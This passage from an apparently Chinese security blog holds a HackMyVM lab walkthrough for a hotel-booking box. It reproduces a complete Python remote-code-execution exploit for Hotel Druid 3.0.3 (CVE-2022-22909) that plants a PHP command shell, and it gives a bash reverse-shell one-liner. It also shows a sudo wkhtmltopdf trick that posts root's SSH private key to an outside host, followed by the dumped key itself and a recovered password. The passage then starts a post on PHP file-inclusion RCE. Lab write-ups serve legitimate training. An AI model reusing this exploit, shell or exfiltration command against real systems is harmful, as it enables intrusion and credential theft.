class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Hotel Druid 3.0.3 - Remote Code Execution (RCE)</span></span><br><span class="line"><span class="comment"># Date: 05/01/2022</span></span><br><span class="line"><span class="comment"># Exploit Author: 0z09e (https://twitter.com/0z09e)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.hoteldruid.com/</span></span><br><span class="line"><span class="comment"># Software Link: https://www.hoteldruid.com/download/hoteldruid_3.0.3.tar.gz</span></span><br><span class="line"><span class="comment"># Version: 3.0.3</span></span><br><span class="line"><span class="comment"># CVE : CVE-2022-22909</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params"> target , username = <span class="string">&quot;&quot;</span> , password = <span class="string">&quot;&quot;</span>, noauth=<span class="literal">False</span></span>):</span><br><span class="line">        login_data = &#123;</span><br><span class="line">                                <span class="string">&quot;vers_hinc&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;nome_utente_phpr&quot;</span> : username,</span><br><span class="line">                                <span class="string">&quot;password_phpr&quot;</span> : password</span><br><span class="line">                                &#125; </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> noauth:</span><br><span class="line">                login_req = requests.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/inizio.php&quot;</span> , data=login_data , verify=<span class="literal">False</span> )</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;&lt;a class=&quot;nav&quot; id=&quot;nb_men&quot; href=&quot;./inizio.php?id_sessione=&#x27;</span> <span class="keyword">in</span> login_req.text:</span><br><span class="line">                        token = login_req.text.split(<span class="string">&#x27;&lt;a class=&quot;nav&quot; id=&quot;nb_men&quot; href=&quot;./inizio.php?id_sessione=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&gt;&amp;nbsp;&lt;b&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                        anno = login_req.text.split(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;anno&quot; value=&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                        ret_data = &#123;<span class="string">&quot;token&quot;</span> : token , <span class="string">&quot;anno&quot;</span> : anno&#125;</span><br><span class="line">                        <span class="comment">#print(&quot;ret data&quot; + ret_data)</span></span><br><span class="line">                        <span class="keyword">return</span> ret_data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                login_req = requests.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/inizio.php&quot;</span> , verify=<span class="literal">False</span> )</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        anno = login_req.text.split(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;anno&quot; value=&quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                        token = <span class="string">&quot;&quot;</span></span><br><span class="line">                        ret_data = &#123;<span class="string">&quot;token&quot;</span> : token , <span class="string">&quot;anno&quot;</span> : anno&#125;</span><br><span class="line">                        <span class="keyword">return</span> ret_data</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_privilege</span>(<span class="params">target , anno , token=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        priv_req = requests.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/visualizza_tabelle.php?id_sessione=<span class="subst">&#123;token&#125;</span>&amp;tipo_tabella=appartamenti&quot;</span> , verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment">#print(priv_req.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Modify&quot;</span> <span class="keyword">in</span> priv_req.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_room</span>(<span class="params">target , anno , token=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        add_room_data = &#123; </span><br><span class="line">                                <span class="string">&quot;anno&quot;</span>: anno,</span><br><span class="line">                                <span class="string">&quot;id_sessione&quot;</span>: token,</span><br><span class="line">                                <span class="string">&quot;n_app&quot;</span>:<span class="string">&quot;&#123;$&#123;system($_REQUEST[&#x27;cmd&#x27;])&#125;&#125;&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;crea_app&quot;</span>:<span class="string">&quot;SI&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;crea_letti&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;n_letti&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;tipo_tabella&quot;</span>:<span class="string">&quot;appartamenti&quot;</span></span><br><span class="line">                                &#125;</span><br><span class="line">        add_req = requests.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/visualizza_tabelle.php&quot;</span> , data=add_room_data , verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment">#print(add_req.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;has been added&quot;</span> <span class="keyword">in</span> add_req.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_code_execution</span>(<span class="params">target</span>):</span><br><span class="line">        code_execution_req = requests.get(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/dati/selectappartamenti.php?cmd=id&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;uid=&quot;</span> <span class="keyword">in</span> code_execution_req.text:</span><br><span class="line">                <span class="keyword">return</span> code_execution_req.text.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">        banner = <span class="string">&quot;&quot;&quot;\n /$$   /$$             /$$               /$$       /$$$$$$$                      /$$       /$$</span></span><br><span class="line"><span class="string">| $$  | $$            | $$              | $$      | $$__  $$                    |__/      | $$</span></span><br><span class="line"><span class="string">| $$  | $$  /$$$$$$  /$$$$$$    /$$$$$$ | $$      | $$  \ $$  /$$$$$$  /$$   /$$ /$$  /$$$$$$$</span></span><br><span class="line"><span class="string">| $$$$$$$$ /$$__  $$|_  $$_/   /$$__  $$| $$      | $$  | $$ /$$__  $$| $$  | $$| $$ /$$__  $$</span></span><br><span class="line"><span class="string">| $$__  $$| $$  \ $$  | $$    | $$$$$$$$| $$      | $$  | $$| $$  \__/| $$  | $$| $$| $$  | $$</span></span><br><span class="line"><span class="string">| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      | $$  | $$| $$      | $$  | $$| $$| $$  | $$</span></span><br><span class="line"><span class="string">| $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$$| $$      | $$$$$$$/| $$      |  $$$$$$/| $$|  $$$$$$$</span></span><br><span class="line"><span class="string">|__/  |__/ \______/    \___/   \_______/|__/      |_______/ |__/       \______/ |__/ \_______/\n\nExploit By - 0z09e (https://twitter.com/0z09e)\n\n&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        req_args = parser.add_argument_group(<span class="string">&#x27;required arguments&#x27;</span>)</span><br><span class="line">        req_args.add_argument(<span class="string">&quot;-t&quot;</span> ,<span class="string">&quot;--target&quot;</span> , <span class="built_in">help</span>=<span class="string">&quot;Target URL. Example : http://10.20.30.40/path/to/hoteldruid&quot;</span> , required=<span class="literal">True</span>)</span><br><span class="line">        req_args.add_argument(<span class="string">&quot;-u&quot;</span> , <span class="string">&quot;--username&quot;</span> , <span class="built_in">help</span>=<span class="string">&quot;Username&quot;</span> , required=<span class="literal">False</span>)</span><br><span class="line">        req_args.add_argument(<span class="string">&quot;-p&quot;</span> , <span class="string">&quot;--password&quot;</span> , <span class="built_in">help</span>=<span class="string">&quot;password&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">        req_args.add_argument(<span class="string">&quot;--noauth&quot;</span> , action=<span class="string">&quot;store_true&quot;</span> , default=<span class="literal">False</span> , <span class="built_in">help</span>=<span class="string">&quot;If No authentication is required to access the dashboard&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">        args = parser.parse_args()                                                                         </span><br><span class="line"></span><br><span class="line">        target = args.target</span><br><span class="line">        <span class="keyword">if</span> target[-<span class="number">1</span>] == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                target = target[:-<span class="number">1</span>]</span><br><span class="line">        noauth = args.noauth</span><br><span class="line"></span><br><span class="line">        username = args.username</span><br><span class="line">        password = args.password</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> noauth == <span class="literal">False</span> <span class="keyword">and</span> (username == <span class="literal">None</span> <span class="keyword">or</span> password == <span class="literal">None</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] Please provide the authentication method.&#x27;</span> )</span><br><span class="line">                quit()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(banner)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> noauth:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Logging in with the credential <span class="subst">&#123;username&#125;</span>:<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                login_result = login(username = username , password = password , target = target)</span><br><span class="line">                <span class="keyword">if</span> login_result != <span class="literal">False</span>:</span><br><span class="line">                        token = login_result.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">                        anno = login_result.get(<span class="string">&#x27;anno&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;[-] Login failed, Check your credential or check if login is required or not .&quot;</span>)</span><br><span class="line">                        quit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] Trying to access the Dashboard.&#x27;</span>)</span><br><span class="line">                login_result = login(username = username , password = password , target = target , noauth=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">if</span> login_result != <span class="literal">False</span>:</span><br><span class="line">                        token = login_result.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">                        anno = login_result.get(<span class="string">&#x27;anno&#x27;</span>) </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;[-] Unable to access the dashboard, Maybe the dashboard is protected with credential.&#x27;</span>)</span><br><span class="line">                        exit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Checking the privilege of the user.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> check_privilege(target= target , token=token , anno=anno):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] User has the privilege to add room.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] User doesn&#x27;t have the privilege to add room.&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Adding a new room.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> add_room(target = target , anno=anno , token=token):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] Room has been added successfully.&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] Unknown error occured, unable to add room. Maybe the room has already been added&#x27;</span>)</span><br><span class="line">                exit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*] Testing code exection&#x27;</span>)</span><br><span class="line">        output = test_code_execution(target = target)</span><br><span class="line">        <span class="keyword">if</span> output != <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Code executed successfully, Go to <span class="subst">&#123;target&#125;</span>/dati/selectappartamenti.php and execute the code with the parameter &#x27;cmd&#x27;.&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+] Example : <span class="subst">&#123;target&#125;</span>/dati/selectappartamenti.php?cmd=id&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Example Output : <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Code execution failed. If the Target is Windows, Check <span class="subst">&#123;target&#125;</span>/dati/selectappartamenti.php and try execute the code with the parameter &#x27;cmd&#x27;. Example : <span class="subst">&#123;target&#125;</span>/dati/selectappartamenti.php?cmd=hostname&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>Exploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2022-22909.py -t http://192.168.189.153  --noauth</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304151258574.png" alt="image-20220304151258574"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304151511432.png" alt="image-20220304151511432"></p><p>修改exp中的一句话，在第五十一行，重新执行之后使用哥斯拉连接即可</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304153000460.png" alt="image-20220304153000460"></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304153123061.png" alt="image-20220304153123061"></p><p>反弹一个shell得到交互式会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.189.133/9999 &lt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304153336414.png" alt="image-20220304153336414"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用脚本跑了一遍，没啥内核提权漏洞，收集一波信息</p><p>查看&#x2F;etc&#x2F;passwd发现有一个名为<strong>person</strong>的普通用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">person:x:1000:1000:person,,,:/home/person:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">avahi:x:107:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">geoclue:x:108:114::/var/lib/geoclue:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;中发现ttylog文件，使用ttyplay重放查看文件内容得到密码 <strong>Endur4nc3.</strong></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304160247494.png" alt="image-20220304160247494"></p><p>切换用户 <strong>person</strong>,使用密码 <strong>Endur4nc3.</strong></p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304160501942.png" alt="image-20220304160501942"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304160631945.png" alt="image-20220304160631945"></p><p>sudo -l 发现&#x2F;usr&#x2F;bin&#x2F;wkhtmltopdf 这个东西不需要root密码认证即可以root身份执行</p><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/wkhtmltopdf /root/root.txt root.pdf</span><br></pre></td></tr></table></figure><p>将root.pdf下载下来打开</p><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304161248494.png" alt="image-20220304161248494"></p><h2 id="root-login"><a href="#root-login" class="headerlink" title="root login"></a>root login</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/wkhtmltopdf --post-file <span class="string">&#x27;file&#x27;</span> /root/.ssh/id_rsa http://192.168.189.133 root.pdf</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304163200666.png" alt="image-20220304163200666"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAtumGaKJe1rTvvHIay2XsiU7x3Jsm6atRdtGPxI1HbpriIXAzAumN</span><br><span class="line">DI/+eIbZWIcX0P5fQcSYH+j+MPs9X/xB0sQ1niwdxzuj6V2ZhiTN1gPpGHLNyyZcu7U2KK</span><br><span class="line">tUlv5OkQlS8jbuC8mFRgy4G45wRvEdnUGJi9iQSnJo9dQsD+wmrFoHWE7zEmhuF8N3OtZy</span><br><span class="line">Ej2yw0sn5qywY58tqPbzKrMaxbeYuwXRfAqoGX757oFAGdQYq0srPRJL8Ysts4Ou12ER6s</span><br><span class="line">B9MqJW4AjYx6t1wUV5UzKjiBZT3UXUvGPK+ei/5cPS1pTlJnDYFiRFJBUd9C+HMha2hhVo</span><br><span class="line">Gb0t+E6b/5XQESfQRW4gItskVrCanE/WrQgBkRLAWB46VN0LgBnhKEN/hK+yEYRVLdDY8p</span><br><span class="line">2ek7Mpy7jg5K81BKUIHRrYN0SYQWG56t6iuXk6E99y0K7g7Edlmr29UsTsCEUWJJCE8T6Z</span><br><span class="line">nAn4iJqLe1ruBK69HSqfsvv8W7pxHy/21FeRPeaZAAAFgEFEpLRBRKS0AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALbphmiiXta077xyGstl7IlO8dybJumrUXbRj8SNR26a4iFwMwLpjQyP/niG2ViH</span><br><span class="line">F9D+X0HEmB/o/jD7PV/8QdLENZ4sHcc7o+ldmYYkzdYD6RhyzcsmXLu1NiirVJb+TpEJUv</span><br><span class="line">I27gvJhUYMuBuOcEbxHZ1BiYvYkEpyaPXULA/sJqxaB1hO8xJobhfDdzrWchI9ssNLJ+as</span><br><span class="line">sGOfLaj28yqzGsW3mLsF0XwKqBl++e6BQBnUGKtLKz0SS/GLLbODrtdhEerAfTKiVuAI2M</span><br><span class="line">erdcFFeVMyo4gWU91F1Lxjyvnov+XD0taU5SZw2BYkRSQVHfQvhzIWtoYVaBm9LfhOm/+V</span><br><span class="line">0BEn0EVuICLbJFawmpxP1q0IAZESwFgeOlTdC4AZ4ShDf4SvshGEVS3Q2PKdnpOzKcu44O</span><br><span class="line">SvNQSlCB0a2DdEmEFhuereorl5OhPfctCu4OxHZZq9vVLE7AhFFiSQhPE+mZwJ+Iiai3ta</span><br><span class="line">7gSuvR0qn7L7/Fu6cR8v9tRXkT3mmQAAAAMBAAEAAAGBAJMGnSKoOYFuSTH5qi4KjJpGWc</span><br><span class="line">VQ9XNoYQAYLO75/Qwb9V6ZeHeD0fviFtM82aH+XReCEIGmC/3CY+htWwU3mJVZYBv3LCyE</span><br><span class="line">dRnVQd2A4e+AjzI2vdLo0CuV2qXQKhuA6RhOHV1S5/+Ticwn1ylXUkrD72EDWBOQDVO6KU</span><br><span class="line">JIvO5DjUaGy1ahh2MpjC0P0lv6GhEthO7UD4utDc/WGHazofyVoRSCooLah2ukiUCNP0sG</span><br><span class="line">m8bnJLkzn9rkRSUwEZk1Y821EGQ6xOh7GM49l84lATircB5xHV0hXFGwbkSgqGJWJWiNZK</span><br><span class="line">j5rJ6ffL6svmt8Wo6H/7uvI4SfrY9lqMrvpS3Rku0emnIFjqsPjOAk2gZ9nyByLxkJR8qZ</span><br><span class="line">APrjzgNIRDpaSKwf3SXhHabnsWC2VV9jv4RIcXkwfIzLiItxJqikpbjk0ifaR/m5EqbPFC</span><br><span class="line">eC25JOETSSWpLDKHRFqaq6S07saOHsGQDtH0yOkylsKISZV8ItT7oLIT0X/jGd6F4BvQAA</span><br><span class="line">AMBFB99XJ+TtBSgFQx7bUKHXRM/80R644ePdx/51Lcj9X1RzIRNzY6OyQyPETRGgEQdbzE</span><br><span class="line">bjX58Wy3cU4qxzz7cmFt4LJ/Pnrwh3236Qpl0A4v8fAyN7HVcm4M7iAHajR57D2zQr61u3</span><br><span class="line">WEpC8aMxIBmPlGeNiF2qqSNU+Nt2FpsmzoIUxqpEKwrAVR0eQbL3SlOTRNseNA2znK3XQ6</span><br><span class="line">n1caFK+5/UXI3OABJ7T3BnxDjLaiXDID1lTgQjp3FYjOou/3MAAADBAOMcpWt4gnv5uf0V</span><br><span class="line">g2cUCpg5KuPb4Od4ptndbfmMzwoEL85GoLFTPjlRmuAcR7uo0Ra/HsQ/2u5j1HbgAXFTAe</span><br><span class="line">5ufeY55GZtOCGWyAhFIXhR6xX6MH6AOrURzUFWmaUvT22DRfYt7HRe2s03Dzitq4QlQK6s</span><br><span class="line">rBhXVAdFeIwQifHwflW0oYKJyBYGoz9hOtlFJPsUvcK7UbZU09c+dVi7WmraiKn26lg+P+</span><br><span class="line">aCm/IoIKe7wea14KKq7KcIWivwlpa8wwAAAMEAzi2fOu9GqJDS11z9vXvry82lv5HzjshO</span><br><span class="line">nqoKX+I4MkhLEm+d+BHv+YI5EyHDzQNxqaDChynUeW/LxPGD8HL1W4u/DIthTQLCYPYt5f</span><br><span class="line">9ien/tPfOIgLRA5K7/PpZbCe6IQA66Hu6o/y2if49I9D/SYFSTxgRUeZqCqcIbf94qUgF7</span><br><span class="line">Jjel1DfBZwXZNUxKggYhhaWAJvOHnxK2AXCd42WtLz6iKz49Bpxkfk/BwtTSe/wJYt+JZx</span><br><span class="line">+MSFR/tgD8RslzAAAACnJvb3RAaG90ZWw=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220304163311432.png" alt="image-20220304163311432"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hackmyvm Machines </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从一次CTF出题中引发的PHP文件包含RCE学习</title>
      <link href="/posts/3502010039/"/>
      <url>/posts/3502010039/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><blockquote><p>内部出题的时候被大师傅点出来的一个问题，正好借机学习一下这个姿势。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个文件包含getshell的姿势是一个大师傅在2021 hxp ctf  “includer’s revenge” 一题中的解题思路，其实作为一个渗透测试人员，这个文件包含的知识点是应该要被学习到的，但是在此之前我并不了解这个姿势，所以就借机学习记录一下吧，也反映出我在这一方面掌握是比较欠缺的。</p><p>简单说就是在PHP中，我们可以利用PHP Base64 Filter宽松的解析，通过iconv filter等编码组合构造出特定的PHP代码（构造出一个简单的webshell）进而造成无需临时文件的file include rce。</p><p>关于该姿势的详细说明可以拜读一下这个大师傅的文章，文章里已经说的相当清楚了，我在这里就不过多赘叙了。</p><p><a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这里使用Dockerfile Build一个漏洞环境</p><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the 